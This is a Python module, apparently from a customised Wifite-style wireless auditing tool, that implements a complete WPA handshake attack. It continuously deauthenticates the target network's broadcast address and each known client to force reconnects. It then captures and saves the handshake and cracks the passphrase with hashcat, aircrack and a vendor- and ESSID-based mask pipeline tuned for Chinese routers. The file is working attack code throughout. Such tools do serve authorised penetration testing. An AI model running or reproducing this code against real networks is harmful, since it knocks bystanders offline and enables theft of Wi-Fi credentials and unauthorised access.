#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.i18n import t
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''Initiates full WPA handshake capture attack.'''

        # Skip if user only wants WPS attacks
        if Configuration.wps_only:
            Color.pl('\r{!} {O}%s{W}' % t('wpa.skip_wps_only'))
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} %s' % t('wpa.analyze'))
        handshake.analyze()

        # Check wordlist
        if Configuration.wordlist is None:
            Color.pl('{!} {O}%s{W}' % t('wpa.no_wordlist'))
            self.success = False
            return False

        elif not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}%s{W}' % t('wpa.wordlist_missing', Configuration.wordlist))
            self.success = False
            return False

        wl_name = os.path.split(Configuration.wordlist)[-1]
        Color.pl('\n{+} {C}%s{W}' % t('wpa.crack', wl_name))

        # 优先 hashcat -m 22000（认 --runtime / path_deadline），失败再 aircrack（墙钟 kill）
        key = self._crack_handshake(handshake)
        if key is None:
            Color.pl('{!} {R}%s{W}' % t('wpa.fail'))
            if getattr(Configuration, 'cn_optimize', False):
                key = self._cn_mask_pipeline(handshake)

        if key is None:
            self.success = False
            return False

        Color.pl('{+} {G}%s{W}\n' % t('wpa.ok', key))
        self.crack_result = CrackResultWPA(
            handshake.bssid,
            handshake.essid,
            handshake.capfile,
            key,
        )
        self.crack_result.dump()
        self.success = True
        return self.success

    def _crack_handshake(self, handshake):
        '''握手爆破：hashcat(预算) → aircrack(预算)。'''
        from ..tools.hashcat import HcxPcapTool, Hashcat
        # 预算尽则不爆破
        if Hashcat.budget_exhausted():
            return None

        # 1) hashcat 22000（与 PMKID 同源，支持 --runtime）
        if Process.exists('hashcat') and HcxPcapTool.exists():
            try:
                key = Hashcat.crack_handshake(handshake, show_command=False)
                if key:
                    return key
            except Exception:
                pass

        # 2) aircrack 带墙钟上限
        if Hashcat.budget_exhausted():
            return None
        return Aircrack.crack_handshake(handshake, show_command=False)

    def _cn_mask_pipeline(self, handshake):
        '''国内 WiFi 掩码自动管线：cap→hc22000→hashcat 多掩码爆破，命中即返回。'''
        hc_file = None
        try:
            from ..tools.hashcat import HcxPcapTool, Hashcat
            from ..util.cn_strategy import recommend_masks
            from ..util.router_advisory import identify_vendor
            if not Process.exists('hashcat') or not HcxPcapTool.exists():
                Color.pl('{!} {O}%s{W}' % t('wpa.cn_skip'))
                return None
            if Hashcat.budget_exhausted():
                return None
            hc_file = HcxPcapTool.generate_hc22000_file(handshake.capfile)
        except Exception as e:
            Color.pl('{!} {O}%s{W}' % t('wpa.cn_fail', str(e)))
            return None
        try:
            from ..tools.hashcat import Hashcat
            vendor = identify_vendor(self.target.bssid) or ''
            masks = recommend_masks(self.target.essid, vendor,
                                    limit=getattr(Configuration, 'cn_mask_limit', 4))
            Color.pl('{+} {O}%s{W}' % t('wpa.cn_run', len(masks)))
            for idx, mask in enumerate(masks, 1):
                if Hashcat.budget_exhausted():
                    break
                Color.pl('{+} {C}CN-OPT{W} mask {C}%d/%d{W} {D}%s{W} ...' % (idx, len(masks), mask))
                key = Hashcat.crack_hc22000_mask(hc_file, mask, verbose=False)
                if key:
                    return key
            return None
        finally:
            try:
                if hc_file and os.path.exists(hc_file):
                    os.remove(hc_file)
            except OSError:
                pass


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.'''
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            # Timer(0) → 首轮立即 deauth，再按 wpa_deauth_timeout 周期补发
            deauth_timer = Timer(0)

            while handshake is None and not timeout_timer.ended():
                # 路径总预算截止则提前结束捕获，把时间留给爆破
                if getattr(Configuration, 'path_deadline', None) is not None:
                    if time.time() >= Configuration.path_deadline:
                        break

                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                        airodump_target,
                        'Handshake capture',
                        'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))

                # 开局 / 周期 deauth（间隔已由调度器与捕获窗口联动）
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                            airodump_target,
                            'Handshake capture',
                            '{G}Captured handshake{W}')
                    Color.pl('')
                    break

                handshake = None
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                airodump_target,
                                'Handshake capture',
                                'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)

                time.sleep(step_timer.remaining())
                continue

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}%s{W}' % t('wpa.capture_fail', Configuration.wpa_attack_timeout))
            return handshake
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)
            return handshake

    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        '''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
            Color.pl('{G}saved{W}')
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl('{G}saved{W}')

        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client of target.
            Scapy 高密度双向帧 + aireplay 双通道（力度不足时的注入辅助）。
            Args:
                target - The Target to deauth, including clients.
        '''
        if Configuration.no_deauth:
            return

        from ..tools.deauth import send_deauth

        # 广播 + 每个已知客户端；优先踢已知 STA（注入更准）
        targets = list(self.clients) + [None]
        for client in targets:
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack('WPA',
                    target,
                    'Handshake capture',
                    'Deauth {O}%s{W}' % target_name)
            send_deauth(
                target.bssid,
                client_mac=client,
                essid=target.essid if getattr(target, 'essid_known', False) else None,
                timeout=2,
            )

if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
        pass
    Configuration.exit_gracefully(0)
